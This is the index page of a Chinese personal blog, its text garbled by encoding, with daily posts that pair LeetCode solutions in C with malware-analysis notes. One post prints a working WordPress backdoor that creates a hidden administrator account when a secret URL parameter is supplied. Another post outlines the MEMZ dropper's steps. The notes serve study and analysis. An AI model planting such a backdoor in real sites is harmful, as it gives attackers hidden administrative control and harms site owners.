<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.2.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="https://raw.githubusercontent.com/TomQunChao/avatar/main/icon00.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>èœå•</li>
						<li>æ ‡ç­¾</li>
						
						<li>å‹æƒ…é“¾æ¥</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">ä¸»é¡µ</a></li>
				        
							<li><a href="/archives">æ‰€æœ‰æ–‡ç« </a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="https://raw.githubusercontent.com/TomQunChao/avatar/main/icon00.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">ä¸»é¡µ</a></li>
		        
					<li><a href="/archives">æ‰€æœ‰æ–‡ç« </a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-index" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/05/index/" class="article-date">
  	<time datetime="2020-10-05T12:25:19.000Z" itemprop="datePublished">2020-10-05</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/05/index/">
        index
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 align="center">ç«¥å¸…çš„åšå®¢ç½¢äº†</h1>





<h6 align="right">ç«¥å¸… 2020-10-5</h6>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-daily/virus/3" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/04/21/daily/virus/3/" class="article-date">
  	<time datetime="2021-04-21T10:42:48.000Z" itemprop="datePublished">2021-04-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/04/21/daily/virus/3/">
        æ¯æ—¥çœ‹ç—…æ¯’åˆ†æå’Œleetcode-3
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="leetcode-91-è§£ç æ–¹æ³•"><a href="#leetcode-91-è§£ç æ–¹æ³•" class="headerlink" title="leetcode-91. è§£ç æ–¹æ³•"></a>leetcode-91. è§£ç æ–¹æ³•</h2><p>æ‰¾å‡ºæœ€é•¿è§£ç æ–¹æ³•</p>
<p>æœ€å¯ç¬‘çš„æ˜¯ä¸€å¹´å‰æäº¤è¿‡äº†ï¼Œä¸”é€Ÿåº¦å¾ˆå¿«ã€‚ç°åœ¨ä¸ä¼šäº†ã€‚</p>
<p>è¿™æ¬¡æ·»åŠ äº†ç¬”è®°ï¼Œåº”è¯¥ä¸ä¼šå¿˜äº†å§</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">numDecodings</span><span class="params">(<span class="keyword">char</span> * s)</span></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line">	<span class="keyword">if</span>(len==<span class="number">0</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(s[<span class="number">0</span>]==<span class="string">&#x27;0&#x27;</span>)<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// ç¬¬ä¸€ä¸ªå°±ä¸º0ï¼Œè‚¯å®šæ˜¯0</span></span><br><span class="line">	<span class="keyword">if</span>(len==<span class="number">1</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> dp[<span class="number">40000</span>]; <span class="comment">// dp[i] è¡¨ç¤ºåˆ°ç¬¬iä¸ªå­—ç¬¦æœ‰dp[i]ç§è§£ç æ–¹æ³•</span></span><br><span class="line">	<span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="number">40000</span>));</span><br><span class="line">	dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> num=(s[<span class="number">0</span>]<span class="number">-48</span>)*<span class="number">10</span>+s[<span class="number">1</span>]<span class="number">-48</span>;</span><br><span class="line">	dp[<span class="number">1</span>]=num&gt;=<span class="number">11</span>&amp;&amp;num&lt;=<span class="number">26</span>&amp;&amp;s[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span>?<span class="number">2</span>:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(s[<span class="number">0</span>]&gt;<span class="string">&#x27;2&#x27;</span>&amp;&amp;s[<span class="number">1</span>]==<span class="string">&#x27;0&#x27;</span>)<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// ä¸å¯èƒ½è§£ç </span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;len;i++)&#123;</span><br><span class="line">		num=(s[i<span class="number">-1</span>]<span class="number">-48</span>)*<span class="number">10</span>+s[i]<span class="number">-48</span>;</span><br><span class="line">		<span class="keyword">if</span>(num==<span class="number">0</span>||s[i]==<span class="string">&#x27;0&#x27;</span>&amp;&amp;s[i<span class="number">-1</span>]&gt;<span class="string">&#x27;2&#x27;</span>)<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// æ— æ³•è§£ç </span></span><br><span class="line">		<span class="keyword">if</span>(s[i]==<span class="string">&#x27;0&#x27;</span>)dp[i]=dp[i<span class="number">-2</span>]; <span class="comment">// è¿™ä¸ªåœ°æ–¹åªèƒ½ä¸¤ä¸ªä¸€èµ·è§£ç ï¼Œæ‰€ä»¥è§£ç æ•°é‡æ²¡æœ‰å¢åŠ </span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(num&gt;=<span class="number">11</span>&amp;&amp;num&lt;=<span class="number">26</span>)dp[i]=dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>]; <span class="comment">// ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æƒ…å†µæ˜¯ä¸¤ä¸ªå­—ç¬¦åˆ†åˆ«è§£ç ï¼Œé‚£ä¹ˆs[i]ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯s[i]å’Œs[i-1]ä¸€èµ·è§£ç </span></span><br><span class="line">		<span class="keyword">else</span> dp[i]=dp[i<span class="number">-1</span>]; <span class="comment">// å½“num&gt;26æ—¶ï¼Œs[i]åªèƒ½å•ç‹¬è§£ç </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> dp[len<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="è€æ¯›æ¡ƒæºå¸¦æœ¨é©¬ç—…æ¯’"><a href="#è€æ¯›æ¡ƒæºå¸¦æœ¨é©¬ç—…æ¯’" class="headerlink" title="è€æ¯›æ¡ƒæºå¸¦æœ¨é©¬ç—…æ¯’"></a>è€æ¯›æ¡ƒæºå¸¦æœ¨é©¬ç—…æ¯’</h2><p>ç«ç»’å¤§å¤§çš„æ–‡ç«  <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1258730-1-1.html">https://www.52pojie.cn/thread-1258730-1-1.html</a></p>
<h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ„Ÿè§‰ä¸œè¥¿ä¸å¤šï¼Œä½†æ˜¯æ²¡æœ‰æ ·æœ¬ä¸å¥½æ“ä½œã€‚å°è¯•äº†è™šæ‹Ÿæœºå®‰è£…ï¼Œè€æ¯›æ¡ƒç›´æ¥æ‰¾ä¸åˆ°è™šæ‹Ÿç£ç›˜ï¼Œçœ‹æ¥æ˜¯å¯¹è¿™ä¸ªåšäº†ä¼˜åŒ–å•Šã€‚ğŸ˜‚</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-daily/virus/2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/04/20/daily/virus/2/" class="article-date">
  	<time datetime="2021-04-20T10:42:48.000Z" itemprop="datePublished">2021-04-20</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/04/20/daily/virus/2/">
        æ¯æ—¥çœ‹ç—…æ¯’åˆ†æå’Œleetcode-2
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="phpæºç è§£å¯†"><a href="#phpæºç è§£å¯†" class="headerlink" title="phpæºç è§£å¯†"></a>phpæºç è§£å¯†</h2><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-693641-1-1.html">https://www.52pojie.cn/thread-693641-1-1.html</a></p>
<p>å…ˆå®‰è£…xdebugã€vscodeçš„PHP debugæ’ä»¶</p>
<p><a target="_blank" rel="noopener" href="https://github.com/nikic/PHP-Parser">https://github.com/nikic/PHP-Parser</a> ä½¿ç”¨è¿™ä¸ªæ ¼å¼åŒ–</p>
<p>ç„¶åå•æ­¥è°ƒè¯•ï¼Œè¿‡æ‰åè°ƒè¯•ï¼Œä¸€ç›´åˆ°evalå°±å¯ä»¥çœ‹åˆ°æºç </p>
<h2 id="leetcode-å®ç°strstr"><a href="#leetcode-å®ç°strstr" class="headerlink" title="leetcode å®ç°strstr"></a>leetcode å®ç°strstr</h2><p>KMPç®—æ³•ä¸€ç›´æ²¡çœ‹æ‡‚ï¼Œè¿™æ¬¡çœ‹çœ‹</p>
<p>å‰ç¼€å‡½æ•°$\pi(i)$è¡¨ç¤º$s[0:i]$æœ€é•¿ç›¸ç­‰çš„çœŸå‰ç¼€å’ŒçœŸåç¼€</p>
<p>å¯¹äºå­—ç¬¦ä¸²aabaaab</p>
<ul>
<li>$\pi(0)=0$ï¼Œå› ä¸ºaæ²¡æœ‰çœŸå‰ç¼€å’ŒçœŸåç¼€</li>
<li>$\pi(1)=1$ï¼Œå› ä¸ºaaæœ€é•¿ç›¸ç­‰çœŸå‰ç¼€å’ŒçœŸåç¼€é•¿åº¦ä¸º1</li>
<li>$\pi(2)=0$ï¼Œå› ä¸ºaabæ²¡æœ‰å¯¹åº”çš„çœŸå‰ç¼€å’ŒçœŸåç¼€</li>
<li>$\pi(3)=1$ï¼Œå› ä¸ºaabaæœ€é•¿ç›¸ç­‰çœŸå‰ç¼€å’ŒçœŸåç¼€é•¿åº¦ä¸º1</li>
<li>$\pi(4)=2$</li>
<li>$\pi(5)=2$</li>
<li>$\pi(6)=3$</li>
</ul>
<p>KMPç®—æ³•æ˜¯ä¸¥æ ¼$O(m)$çš„ï¼Œé çš„å°±æ˜¯å‰ç¼€å‡½æ•°çš„å‡ ä¸ªæ€§è´¨</p>
<ol>
<li><p>$\pi(i)\le\pi(i-1)+1$ï¼Œç›´è§‚åœ°æƒ³ï¼Œå¢åŠ äº†ä¸€ä¸ªå­—ç¬¦ä¹‹åæœ€å¤šå¢åŠ ä¸€ä¸ªçœŸå‰ç¼€å’ŒçœŸåç¼€çš„ç›¸ç­‰çš„å­—ç¬¦</p>
<ul>
<li>æ ¹æ®$\pi(i)$å®šä¹‰å¾—åˆ°$\s[0:\pi(i)-1]=s[i-\pi(i)+1:i]$ï¼Œå³$\pi(i)$é•¿åº¦çš„çœŸå‰ç¼€å’ŒçœŸåç¼€ç›¸ç­‰</li>
<li>ä¸¤åŒºé—´çš„å³ç«¯ç‚¹åŒæ—¶å·¦ç§»ï¼Œå¾—åˆ°$s[0:\pi(i)-2]=s[i-\pi(i)+1:i-1]$ï¼Œå³çœŸå‰ç¼€å’ŒçœŸåç¼€å„å‡å°‘ä¸€ä¸ªå­—ç¬¦</li>
<li>æ ¹æ®$\pi(i-1)$å®šä¹‰å¾—$\pi(i-1)\ge\pi(i)-1$ï¼Œå¦‚æœ$\pi(i)\ne0$ï¼Œé‚£ä¹ˆæœ€åä¸€ä¸ªå­—ç¬¦è‚¯å®šå’ŒçœŸå‰ç¼€åœ°æŸä¸ªå­—ç¬¦ç›¸ç­‰ï¼Œåˆ æ‰ä¹‹å$\pi$å‡½æ•°è‚¯å®šè¦å‡1</li>
</ul>
</li>
<li><p>å¦‚æœ$s[i]=s[\pi(i-1)]$ï¼Œé‚£ä¹ˆ$\pi(i)=\pi(i-1)+1$ï¼Œç›´è§‚åœ°æƒ³ï¼Œè¿™åˆ†åˆ«æ˜¯æ˜¯$\pi(i-1)$çš„çœŸåç¼€çš„ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆç«‹</p>
<ul>
<li>æ ¹æ®$\pi(i-1)$å®šä¹‰å¾—åˆ°ï¼Œ$s[0:\pi(i-1)-1]=s[i-\pi(i-1):i-1]$ï¼Œå°±æ˜¯1ç¬¬ä¸€ä¸ªå¼å­å¸¦å…¥$i-1$ï¼ˆ1ï¼‰</li>
<li>å› ä¸º$s[\pi(i-1)]=s[i]$ï¼Œå¯å¾—$s[0:\pi(i-1)]=s[i-\pi(i-1):i]$ï¼ŒçœŸå‰ç¼€å’ŒçœŸåç¼€å„å¢åŠ ä¸€ä¸ªç›¸ç­‰å­—ç¬¦</li>
<li>æ ¹æ®$\pi(i)$å®šä¹‰å¾—$\pi(i)\ge\pi(i-1)+1$ï¼Œå³æœ‰ç›¸ç­‰çš„ä¹‹åçœŸå‰ç¼€å’ŒçœŸåç¼€ç›¸ç­‰é•¿åº¦å¯èƒ½å¢åŠ ï¼Œç»“åˆç¬¬ä¸€ä¸ªæ€§è´¨å¾—åˆ°$\pi(i)=\pi(i-1)+1$</li>
</ul>
</li>
</ol>
<p>è¿™æ ·å°±å¯ä»¥æ ¹æ®è¿™ä¸¤ä¸ªæ€§è´¨æ±‚å‡º$\pi(i)$ï¼Œæ‰¾åˆ°æœ€å¤§çš„$j$ï¼Œæ»¡è¶³$s[0:j-1]=s[i-j:i-1]$ï¼Œä¸”$s[i]=s[j]$ï¼Œå°±å¾—åˆ°$\pi(i)=j+1$</p>
<ol>
<li>è¦æ±‚$j$å°½å¯èƒ½å¤§</li>
<li>è¦æ±‚$j$æ»¡è¶³$s[i]=s[j]$</li>
</ol>
<p>å½“$s[\pi(i-1)]\ne s[i]$æ—¶ï¼Œ$\pi(i)\le\pi(i-1)$ï¼Œå› ä¸º$j=\pi(i)-1$ï¼Œæ‰€ä»¥$j\lt\pi(i)-1$ï¼Œäºæ˜¯å¯ä»¥å–ï¼ˆ1ï¼‰å¼ä¸¤å­—ä¸²çš„é•¿åº¦ä¸ºjçš„åç¼€ï¼Œå®ƒä»¬ä¾ç„¶æ˜¯ç›¸ç­‰çš„ï¼š$s[\pi(i-1)-j:\pi(i-1)-1]=s[i-j:i-1]$</p>
<p>å®é™…ä¸Šæ˜¯ä¸€ä¸ªæœ‰é™çŠ¶æ€è‡ªåŠ¨æœº</p>
<p>æ¥æ”¶åˆ°ä¸€ä¸ªå­—ç¬¦ä¹‹åï¼Œå¦‚æœå’Œå½“å‰å­—ç¬¦ç›¸ç­‰ï¼Œå°±è¿›å…¥ä¸‹ä¸€ä¸ªå­—ç¬¦çš„åŒ¹é…ï¼Œå¦‚æœä¸ç›¸ç­‰ï¼Œåˆ™ä¾æ®å½“å‰çŠ¶æ€å’Œè¾“å…¥å­—ç¬¦åˆ¤æ–­ä¸‹ä¸€ä¸ªçŠ¶æ€æ˜¯å“ªä¸ªï¼Œæœ€ç»ˆæ˜¯ä¸€ä¸ªæœ‰é™çŠ¶æ€è‡ªåŠ¨æœºã€‚</p>
<p>è®¾è¦åŒ¹é…çš„å­—ç¬¦ä¸²ä¸ºpatï¼ŒåŸå­—ç¬¦ä¸²ä¸ºtxt</p>
<p>æ„é€ çŠ¶æ€è½¬ç§»çŸ©é˜µdpï¼Œå¦‚æœå­—ç¬¦ç­‰äºpat[j]ï¼Œåˆ™è½¬ç§»åˆ°ä¸‹ä¸€ä¸ªçŠ¶æ€ï¼Œå¦åˆ™å°±å›é€€åˆ°å’Œè‡ªå·±ç›¸åŒçš„æœ€é•¿å‰ç¼€ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strStr</span><span class="params">(<span class="keyword">char</span> * haystack, <span class="keyword">char</span> * needle)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> dp[<span class="number">40000</span>][<span class="number">128</span>];</span><br><span class="line">	<span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="number">40000</span>*<span class="number">128</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">	<span class="keyword">size_t</span> xlen=<span class="built_in">strlen</span>(haystack);</span><br><span class="line">	<span class="keyword">size_t</span> ylen=<span class="built_in">strlen</span>(needle);</span><br><span class="line">	<span class="keyword">if</span>(ylen==<span class="number">0</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> x=<span class="number">0</span>; <span class="comment">// å½±å­çŠ¶æ€</span></span><br><span class="line">	dp[<span class="number">0</span>][needle[<span class="number">0</span>]]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">1</span>;i&lt;ylen;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">char</span> c=<span class="number">0</span>;c&lt;<span class="number">127</span>;c++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(c==needle[i])&#123;</span><br><span class="line">				dp[i][c]=i+<span class="number">1</span>;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				dp[i][c]=dp[x][c];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		x=dp[x][needle[i]]; <span class="comment">// è¿™é‡Œå¯ä»¥åˆ¤æ–­xå’Œå½“å‰å­—ç¬¦æ˜¯å¦æœ‰æœ€å¤§å‰ç¼€</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> state=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;xlen;i++)&#123;</span><br><span class="line">		state=dp[state][haystack[i]];</span><br><span class="line">		<span class="comment">// printf(&quot;%d\n&quot;,state);</span></span><br><span class="line">		<span class="keyword">if</span>(state==ylen)&#123;</span><br><span class="line">			<span class="keyword">return</span> i-ylen+<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒï¼š</p>
<p>é¢˜è§£ </p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/83334559">https://zhuanlan.zhihu.com/p/83334559</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-daily/virus/1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/04/19/daily/virus/1/" class="article-date">
  	<time datetime="2021-04-19T10:42:48.000Z" itemprop="datePublished">2021-04-19</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/04/19/daily/virus/1/">
        æ¯æ—¥çœ‹ç—…æ¯’åˆ†æå’Œleetcode-1
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="justnews-5-2-3ç ´è§£ç‰ˆåé—¨"><a href="#justnews-5-2-3ç ´è§£ç‰ˆåé—¨" class="headerlink" title="justnews 5.2.3ç ´è§£ç‰ˆåé—¨"></a>justnews 5.2.3ç ´è§£ç‰ˆåé—¨</h2><p>52pojieé“¾æ¥ <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1084019-1-1.html">https://www.52pojie.cn/thread-1084019-1-1.html</a></p>
<p>æ²¡æœ‰æœåˆ°æ ·æœ¬ï¼Œåé—¨æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>functions.php æ·»åŠ äº†ä¸€ä¸ªåé—¨çš„åŠ¨ä½œï¼Œå¢åŠ äº†ä¸€ä¸ªè®¿é—®å¯†é’¥ä¸ºgo,backdoor/123456çš„è´¦æˆ·</li>
<li>åé¢ä¸€ä¸ªpanel.phpå¤šå±‚base64ç¼–ç äº†ç½‘ç«™ã€ä½œè€…ç­‰ä¿¡æ¯ã€‚</li>
</ol>
<p>è¿™ä¸ªä½œè€…çš„å¦ä¸€ç¯‡æ–‡ç«  <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1074873-1-1.html">https://www.52pojie.cn/thread-1074873-1-1.html</a></p>
<p>æœ‰æ ·æœ¬ï¼ŒæŸ¥çœ‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add_action(<span class="string">&#x27;wp_head&#x27;</span>, <span class="string">&#x27;wp_backdoor&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_backdoor</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (md5($_GET[<span class="string">&#x27;backdoor&#x27;</span>]) == <span class="string">&#x27;34d1f91fb2e514b8576fab1a75a89a6b&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">require</span>(<span class="string">&#x27;wp-includes/registration.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!username_exists(<span class="string">&#x27;backdoor&#x27;</span>)) &#123;</span><br><span class="line">			$user_id = wp_create_user(<span class="string">&#x27;backdoor&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line">			$user = <span class="keyword">new</span> WP_User($user_id);</span><br><span class="line">			$user-&gt;set_role(<span class="string">&#x27;administrator&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å’Œè¿™ä¸ªä¸€æ ·çš„é€»è¾‘å•Šã€‚ã€‚</p>
<p>æ··æ·†åŠ å¯†å¸–å­ <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1074918-1-1.html">https://www.52pojie.cn/thread-1074918-1-1.html</a></p>
<p>PHP Debug+vscode+xDebug+php7.2+PHP æ™ºèƒ½è¡¥å…¨ï¼Œå•æ­¥è°ƒè¯•åˆ°evalå°±å¯ä»¥çœ‹åˆ°ä¸»é€»è¾‘</p>
<p>phpè§£å¯†èµ„æ–™(zymåŠ å¯†)<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-693641-1-1.html">https://www.52pojie.cn/thread-693641-1-1.html</a></p>
<h2 id="ä¼ªè£…æˆdocxçš„ç—…æ¯’åˆ†æ"><a href="#ä¼ªè£…æˆdocxçš„ç—…æ¯’åˆ†æ" class="headerlink" title="ä¼ªè£…æˆdocxçš„ç—…æ¯’åˆ†æ"></a>ä¼ªè£…æˆdocxçš„ç—…æ¯’åˆ†æ</h2><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1412858-1-1.html">https://www.52pojie.cn/thread-1412858-1-1.html</a></p>
<p>æ²¡æœ‰ç»™æ ·æœ¬</p>
<p>å¯ä»¥ä½¿ç”¨Detous Hookåè°ƒè¯•å‡½æ•°(æ–°çŸ¥è¯†)</p>
<h2 id="å½©è™¹çŒ«-MEMZ-ç—…æ¯’åˆ†æ"><a href="#å½©è™¹çŒ«-MEMZ-ç—…æ¯’åˆ†æ" class="headerlink" title="å½©è™¹çŒ«(MEMZ)ç—…æ¯’åˆ†æ"></a>å½©è™¹çŒ«(MEMZ)ç—…æ¯’åˆ†æ</h2><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1096117-1-1.html">https://www.52pojie.cn/thread-1096117-1-1.html</a></p>
<p>è§£å‹åæœ‰ä¸ªbatæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨æ‰¹å¤„ç†+ActiveXå‘½ä»¤</p>
<p>æµç¨‹ï¼š</p>
<ol>
<li>ä½¿ç”¨base64ä¸²å»ºç«‹xæ–‡ä»¶</li>
<li>å»ºç«‹x.jsï¼Œç”¨äºbase64è§£ç xåˆ°z.zip</li>
<li>è§£ç xä¹‹åå†è§£å‹memzæ–‡ä»¶åˆ°%appdata%\MEMZ.exe</li>
<li>åˆ é™¤xï¼Œx.jsï¼Œz.zip</li>
<li>æ‰§è¡ŒMEMZ.exe</li>
</ol>
<p>è¿‡ç¨‹ä¸­æ‰€æœ‰çš„è¾“å‡ºå‡è¢«é‡å®šå‘åˆ°NUL</p>
<p>å‰é¢è¾“å…¥äº†ä¸€å¤§å †base64ï¼Œè¾“å‡ºåæ˜¯ä¸ªmagic numberä¸ºPKçš„æ–‡ä»¶ï¼Œç»“åˆbatæ–‡ä»¶å‘½ä»¤ï¼Œè¿™åº”è¯¥æ˜¯ä¸€ä¸ªzipå‹ç¼©åŒ…</p>
<p>è§£å‹ä¹‹åå°±æ˜¯é‚£ä¸ªmemz.exeäº†(åªæœ‰15kbçš„ç—…æ¯’ï¼Œå¾ˆæœ‰å‰é€”å•Š)</p>
